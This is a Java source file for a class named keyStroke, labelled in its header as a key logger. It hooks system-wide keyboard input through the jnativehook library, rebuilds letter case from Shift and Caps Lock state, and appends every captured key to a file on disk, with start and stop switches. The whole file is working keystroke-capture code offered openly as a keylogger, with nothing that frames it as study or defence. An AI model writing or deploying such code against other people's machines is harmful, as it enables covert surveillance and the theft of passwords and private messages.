package utility;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * @author avAnkyAnkit last modified @18-Mar-2018 @1:31:45 AM Key Logger - TODO
 */

public class keyStroke implements NativeKeyListener {

	private String lastKey = "";
	private String[] modifier_Keys = { "Shift", "Ctrl", "Alt", "Windows" };
	private FileReadWrite op;
	private boolean run;
	private long lastVisit;

	public keyStroke(String path) {
		op = new FileReadWrite(path);
		lastVisit = System.currentTimeMillis();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (!run)
			return;

		boolean isAlpha = key.charAt(0) >= 'A' && key.charAt(0) <= 'Z';
		if (key.length() == 1 && isAlpha) {
			boolean isShift = lastKey.equals("Shift");
			boolean isOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
			if ((isOn && isShift) || ((!isOn) && (!isShift))) {
				op.add(key.toLowerCase());
				// System.out.println("key add " + key.toLowerCase());
			} else {
				long Delay = System.currentTimeMillis() - lastVisit;
				if (Delay <= 500) {
					op.add(key);
					// System.out.println("key add " + key);
				} else {
					op.add(key.toLowerCase());
					// System.out.println("key add " + key.toLowerCase());
				}
			}
		} else {
			op.add(key);
			// System.out.println("added " + key);
		}
		lastVisit = System.currentTimeMillis();
		this.lastKey = key;
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}

	/**
	 * @param key
	 * @return
	 */
	private boolean check(String key) {
		if (!lastKey.equals(key))
			return true;
		for (String mod_key : modifier_Keys) {
			if (key.equals(mod_key))
				return false;
		}
		return true;
	}

	public void start() {
		this.run = true;
		op.addTofile("Enter");
		op.addTofile("----------------------");
		op.addTofile("Enter");
	}

	public void stop() {
		this.run = false;
		op.addTofile("Enter");
	}

}
